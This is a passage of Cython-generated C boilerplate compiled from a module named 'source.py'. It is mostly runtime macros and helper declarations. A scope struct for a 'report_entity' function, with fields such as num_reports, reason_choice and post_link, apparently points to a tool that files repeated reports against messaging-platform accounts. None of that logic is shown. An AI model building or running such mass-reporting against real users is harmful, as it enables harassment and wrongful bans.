  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/
struct __pyx_obj_6source___pyx_scope_struct__report_entity;


struct __pyx_obj_6source___pyx_scope_struct__report_entity {
  PyObject_HEAD
  PyObject *__pyx_v__;
  PyObject *__pyx_v_channel;
  PyObject *__pyx_v_channel_username;
  PyObject *__pyx_v_client;
  PyObject *__pyx_v_e;
  PyObject *__pyx_v_entity;
  PyObject *__pyx_v_entity_username;
  PyObject *__pyx_v_i;
  PyObject *__pyx_v_message_id;
  PyObject *__pyx_v_num_reports;
  PyObject *__pyx_v_number;
  PyObject *__pyx_v_parts;
  PyObject *__pyx_v_post_link;
  PyObject *__pyx_v_reason_choice;
  PyObject *__pyx_v_reason_name;
  PyObject *__pyx_v_report_type;
  PyObject *__pyx_t_0;
  PyObject *__pyx_t_1;
  PyObject *__pyx_t_2;
  Py_ssize_t __pyx_t_3;
  PyObject *__pyx_t_4;
  PyObject *(*__pyx_t_5)(PyObject *);
  int __pyx_t_6;
  int __pyx_t_7;
  PyObject *__pyx_t_8;
  PyObject *__pyx_t_9;
  char const *__pyx_t_10;
};


/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* IncludeStringH.proto */
#include <string.h>

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyIntCompare.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, long intval, long inplace);

/* GetItemInt.proto */
